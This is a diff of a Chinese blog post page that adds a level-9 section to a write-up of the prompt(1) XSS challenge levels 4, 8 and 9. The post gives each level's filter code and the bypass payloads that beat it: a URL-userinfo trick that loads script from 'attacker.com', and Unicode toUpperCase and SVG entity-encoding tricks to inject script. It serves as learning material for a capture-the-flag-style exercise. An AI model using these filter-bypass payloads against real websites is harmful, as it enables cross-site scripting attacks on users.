@@ -31,8 +31,9 @@
 <meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252045135.png">
 <meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252049606.png">
 <meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252310220.png">
+<meta property="og:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309261135067.png">
 <meta property="article:published_time" content="2023-09-25T12:46:12.000Z">
-<meta property="article:modified_time" content="2023-09-25T15:11:47.711Z">
+<meta property="article:modified_time" content="2023-09-26T03:40:25.651Z">
 <meta property="article:author" content="SB">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252049569.png">
@@ -177,10 +178,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-09-25 20:46:12 / Modified: 23:11:47" itemprop="dateCreated datePublished" datetime="2023-09-25T20:46:12+08:00">2023-09-25</time>
+              <time title="Created: 2023-09-25 20:46:12" itemprop="dateCreated datePublished" datetime="2023-09-25T20:46:12+08:00">2023-09-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-26 11:40:25" itemprop="dateModified" datetime="2023-09-26T11:40:25+08:00">2023-09-26</time>
+              </span>
 
           
 
@@ -197,16 +204,15 @@
 <p>出自prompt(1)小挑战记录有意思的题目</p>
 <span id="more"></span>
 
-<p>level-4</p>
-<p>只允许如下站点的脚本 <a target="_blank" rel="noopener" href="http://prompt.ml/js/test.js">http://prompt.ml/js/test.js</a></p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>只允许如下站点的脚本 <a target="_blank" rel="noopener" href="http://prompt.ml/js/test.js">http://prompt.ml/js/test.js</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (/^(?:https?:)?\/\/prompt\.ml\<span class="comment">//i.test(decodeURIComponent(input))) &#123;</span></span><br><span class="line">        <span class="keyword">var</span> script = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid resource.&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>题目分析：这里通过限制src的值的开头必须为<a target="_blank" rel="noopener" href="http://prompt.ml/%EF%BC%8C%E6%9D%A5%E8%BE%BE%E5%88%B0src%E7%9A%84%E5%80%BC%E5%BF%85%E9%A1%BB%E4%B8%BA%E5%90%8C%E6%BA%90%E7%9A%84%E8%84%9A%E6%9C%AC%E7%9A%84%E7%9B%AE%E7%9A%84%EF%BC%8C%E6%9F%A5%E6%89%BE%E8%B5%84%E6%96%99%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8url%E7%9A%84%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87">http://prompt.ml/，来达到src的值必须为同源的脚本的目的，查找资料发现可以利用url的特性绕过</a>.</p>
-<p>浏览器支持这样的url：user:<a href="mailto:&#x70;&#97;&#115;&#x73;&#x77;&#111;&#114;&#100;&#x40;&#97;&#x74;&#x74;&#x61;&#99;&#x6b;&#x65;&#114;&#46;&#x63;&#111;&#109;">&#x70;&#97;&#115;&#x73;&#x77;&#111;&#114;&#100;&#x40;&#97;&#x74;&#x74;&#x61;&#99;&#x6b;&#x65;&#114;&#46;&#x63;&#111;&#109;</a>。意思是使用user:password登录到站点attacker.com.</p>
-<p>举例如下：admin:<a href="mailto:&#x31;&#50;&#x33;&#52;&#53;&#54;&#64;&#119;&#x77;&#119;&#46;&#x62;&#x61;&#105;&#100;&#x75;&#x2e;&#99;&#x6f;&#109;">&#x31;&#50;&#x33;&#52;&#53;&#54;&#64;&#119;&#x77;&#119;&#46;&#x62;&#x61;&#105;&#100;&#x75;&#x2e;&#99;&#x6f;&#109;</a>，意即使用用户名admin和密码123456登录到百度站点。</p>
-<p>当然这个url也可以简化为<a href="mailto:&#117;&#x73;&#101;&#x72;&#x40;&#x61;&#x74;&#x74;&#x61;&#99;&#x6b;&#x65;&#x72;&#46;&#99;&#111;&#109;">&#117;&#x73;&#101;&#x72;&#x40;&#x61;&#x74;&#x74;&#x61;&#99;&#x6b;&#x65;&#x72;&#46;&#99;&#111;&#109;</a>，即省略密码。</p>
+<p>浏览器支持这样的url：user:<a href="mailto:&#x70;&#97;&#x73;&#115;&#x77;&#111;&#114;&#x64;&#x40;&#97;&#116;&#x74;&#97;&#99;&#x6b;&#101;&#x72;&#46;&#x63;&#x6f;&#x6d;">&#x70;&#97;&#x73;&#115;&#x77;&#111;&#114;&#x64;&#x40;&#97;&#116;&#x74;&#97;&#99;&#x6b;&#101;&#x72;&#46;&#x63;&#x6f;&#x6d;</a>。意思是使用user:password登录到站点attacker.com.</p>
+<p>举例如下：admin:<a href="mailto:&#49;&#50;&#51;&#x34;&#x35;&#x36;&#64;&#119;&#119;&#x77;&#x2e;&#x62;&#97;&#x69;&#x64;&#x75;&#x2e;&#99;&#111;&#109;">&#49;&#50;&#51;&#x34;&#x35;&#x36;&#64;&#119;&#119;&#x77;&#x2e;&#x62;&#97;&#x69;&#x64;&#x75;&#x2e;&#99;&#111;&#109;</a>，意即使用用户名admin和密码123456登录到百度站点。</p>
+<p>当然这个url也可以简化为<a href="mailto:&#117;&#x73;&#101;&#114;&#64;&#97;&#116;&#116;&#97;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;">&#117;&#x73;&#101;&#114;&#64;&#97;&#116;&#116;&#97;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;</a>，即省略密码。</p>
 <p>因此我们在构造<a target="_blank" rel="noopener" href="http://prompt.ml/@attacker.com%E7%B1%BB%E4%BC%BC%E7%9A%84Payload%EF%BC%8C%E5%B0%86http://prompt.ml/%E4%BD%9C%E4%B8%BAuser%EF%BC%8Cattack.com%E7%90%86%E6%89%80%E5%BA%94%E5%BD%93%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E7%BB%95%E8%BF%87%E4%BA%86%E5%90%8C%E6%BA%90%E9%99%90%E5%88%B6%E3%80%82">http://prompt.ml/@attacker.com类似的Payload，将http://prompt.ml/作为user，attack.com理所应当就是我们自己的服务器，这样就绕过了同源限制。</a></p>
 <p>但是这个payload还不行，因为 &#x2F; 出现在user中是不允许的。考虑到这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过。</p>
 <p>在这里我选择使用 Python3在本地启动简易 Http 服务器<br>启动服务<br>在需要监听的文件夹打开命令行，输入命令：</p>
@@ -218,8 +224,7 @@
 <img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252045135.png"/>
 
 <p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309252049606.png" alt="image-20230925204725264"></p>
-<p>level-8</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.<span class="title function_ invoke__">replace</span>(/[\r\n&lt;/<span class="string">&quot;]/g, &#x27;&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return &#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log(&quot;</span><span class="string">&#x27; + input + &#x27;</span><span class="string">&quot;);        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;;</span></span><br><span class="line"><span class="string">&#125;    </span></span><br></pre></td></tr></table></figure>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.<span class="title function_ invoke__">replace</span>(/[\r\n&lt;/<span class="string">&quot;]/g, &#x27;&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return &#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log(&quot;</span><span class="string">&#x27; + input + &#x27;</span><span class="string">&quot;);        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;;</span></span><br><span class="line"><span class="string">&#125;    </span></span><br></pre></td></tr></table></figure>
 
 <p>这题一开始就把我们输入的内容都放到 <code>&lt;script&gt;</code> 标签里面了，换言之我们可以直接注入 JS 代码。</p>
 <p>但实际上所输入的内容都在 行注释 <code>//</code> 后面，即使注入了 JS 也被注释掉，无法执行</p>
@@ -249,6 +254,44 @@
 
 <p>输入这个 payload 即可完成挑战（但是题目输出依然看不见换行效果…）</p>
 <p>参考链接： <a target="_blank" rel="noopener" href="https://exp-blog.com/safe/ctf/prompt/level-8-unicode/">https://exp-blog.com/safe/ctf/prompt/level-8-unicode/</a></p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.<span class="title function_ invoke__">replace</span>(/&lt;([a-zA-Z])/g, <span class="string">&#x27;&lt;_$1&#x27;</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.<span class="title function_ invoke__">toUpperCase</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这题用正则 <code>&lt;([a-zA-Z])</code> 把所有正常标签都过滤成了 <code>&lt;_</code> ，而我们的输入内容都在 <code>&lt;h1&gt;</code> 标签里面，导致常规可以注入 JS 的标签基本都失效。</p>
+<p>不过注意到题目会把我们输入的内容使用 <code>toUpperCase</code> 方法全部转换成大写。</p>
+<p>一般情况下这个方法只对 ASCII 小写字母起作用，但是根据 <a target="_blank" rel="noopener" href="http://ecma-international.org/ecma-262/5.1/#sec-15.5.4.18">ECAMScript 定义</a>，这个方法对部分 Unicode 字符也会起作用，即它有意把某些 Unicode 字符映射到某些 ASCII 字符（串）。</p>
+<p>但是我们不清楚这个具体的映射表是什么，是否可利用。</p>
+<p>于是我简单写了这个 JS 代码，拷贝到浏览器的控制台运行，即可把 Unicode 通过 <code>toUpperCase</code> 方法映射到 ASCII 的映射表打印出来（<em>此代码只打印了 XSS 可能会用到的 ASCII 字符，并未把全部字符列印</em>）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">UNICODE_RANGE</span> = <span class="number">65000</span>;</span><br><span class="line"><span class="variable constant_">XSS_ASCII_RANGE</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\&quot;/?&gt;&lt;&#x27;;:.,|\\+=-_*&amp;^%$#@!~`\r\n&quot;</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="variable constant_">UNICODE_RANGE</span>; i++) &#123;</span><br><span class="line">    raw_ch = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)</span><br><span class="line">    low_ch = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    upp_ch = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">XSS_ASCII_RANGE</span>.<span class="title function_">includes</span>(raw_ch.<span class="title function_">toLowerCase</span>())) &#123;</span><br><span class="line">        low_ch = raw_ch.<span class="title function_">toLowerCase</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">XSS_ASCII_RANGE</span>.<span class="title function_">includes</span>(raw_ch.<span class="title function_">toUpperCase</span>())) &#123;</span><br><span class="line">        upp_ch = raw_ch.<span class="title function_">toUpperCase</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((low_ch != <span class="string">&quot;&quot;</span> || upp_ch != <span class="string">&quot;&quot;</span>) &amp;&amp; !(<span class="variable constant_">XSS_ASCII_RANGE</span>.<span class="title function_">includes</span>(raw_ch))) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">            <span class="string">&quot;Unicode-Idx: [&quot;</span> + i + <span class="string">&quot;], &quot;</span> + </span><br><span class="line">            <span class="string">&quot;Raw-Unicode: [&quot;</span> + raw_ch + <span class="string">&quot;], &quot;</span> + </span><br><span class="line">            <span class="string">&quot;Unicode-Hex: [\\u&quot;</span> + (i).<span class="title function_">toString</span>(<span class="number">16</span>) + <span class="string">&quot;], &quot;</span> + </span><br><span class="line">            <span class="string">&quot;To-LowerCase-ASCII: [&quot;</span> + low_ch + <span class="string">&quot;], &quot;</span> + </span><br><span class="line">            <span class="string">&quot;To-UpperCase-ASCII: [&quot;</span> + upp_ch + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>用运行结果来看，有两个字符的映射是明显对我们有用的：</p>
+<ul>
+<li>Unicode 的 <code>ı</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>I</code></li>
+<li>Unicode 的 <code>ſ</code> 通过 <code>toUpperCase</code> 会被转换成 ASCII 的 <code>S</code></li>
+</ul>
+<blockquote>
+<p>可以映射到 <code>ST</code> 的两个字符 <code>ﬅ</code> 或 <code>ﬆ</code> 也是可以利用的，只是相对没那么方便。</p>
+</blockquote>
+<p>换言之，只要我们输入 <code>&lt;ı</code> 或 <code>&lt;ſ</code> ，即可绕过题目对标签名的正则过滤，而题目的 <code>toUpperCase</code> 方法又会帮我们将他们转换成 <code>&lt;I</code> 或 <code>&lt;S</code> 。</p>
+<p>由于 HTML 的标签名和属性名都是大小写不敏感的，因此我们就可以利用这个特点，注入以 <code>I</code> 或 <code>S</code> 开头的标签。</p>
+<p>由此首先想到可以的标签就有 3 个 ： <code>&lt;IMG&gt;</code> 、<code>&lt;SCRIPT&gt;</code> 、<code>&lt;SVG&gt;</code></p>
+<p>标签弄完之后，还是不行因为还有 <strong>toUpperCase</strong>需要绕过</p>
+<p>尝试注入 payload <code>&lt;ımg src=0 onerror=prompt(1) /&gt;</code></p>
+<p>虽然成功注入为 <code>&lt;IMG SRC=0 ONERROR=PROMPT(1) /&gt;</code> ，但是在触发 <code>onerror</code> 事件时报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught ReferenceError: PROMPT is not defined</span><br></pre></td></tr></table></figure>
+
+<p>原因是 JS 对函数名是大小写敏感的，而 <code>prompt</code> 也被转换成了大写。</p>
+<p>此时我想到可以利用 <code>&lt;svg&gt;</code> <strong>运行时才解析实体编码</strong>的特性，对大写转换进行绕过。</p>
+<p>即先把 <code>prompt</code> 编码成 <code>prompt</code> ，这样实体编码在输出到前端之前， <code>toUpperCase</code> 对它就不起作用了。</p>
+<p>然后再使用 <code>&lt;svg&gt;</code> 标签包围实体编码，实体编码就能在输出到前端后、在运行时被解析还原成 <code>prompt</code> 。</p>
+<p>于是把 payload 修改成这样，完成挑战：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="tag">&lt;<span class="name">ſvg</span>&gt;</span><span class="tag">&lt;ſcript&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#109;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202309261135067.png" alt="image-20230926113501963"></p>
+<p>参考: <a target="_blank" rel="noopener" href="https://exp-blog.com/safe/ctf/prompt/level-9-ecmascript/">https://exp-blog.com/safe/ctf/prompt/level-9-ecmascript/</a></p>
 
     </div>
 
@@ -267,7 +310,10 @@
     <a href="/2023/09/20/%E7%AC%94%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="笔试题记录">
       <i class="fa fa-chevron-left"></i> 笔试题记录
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/09/26/%E9%9D%A2%E8%AF%95%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="面试题记录">
+      面试题记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -326,7 +372,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E8%BF%87%E6%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">绕过注释过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-payload"><span class="nav-number">2.</span> <span class="nav-text">构造 payload</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#level-4"><span class="nav-number">1.</span> <span class="nav-text">level-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8"><span class="nav-number">2.</span> <span class="nav-text">level-8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">绕过注释过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-payload"><span class="nav-number">2.2.</span> <span class="nav-text">构造 payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-9"><span class="nav-number">3.</span> <span class="nav-text">level-9</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -340,7 +386,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
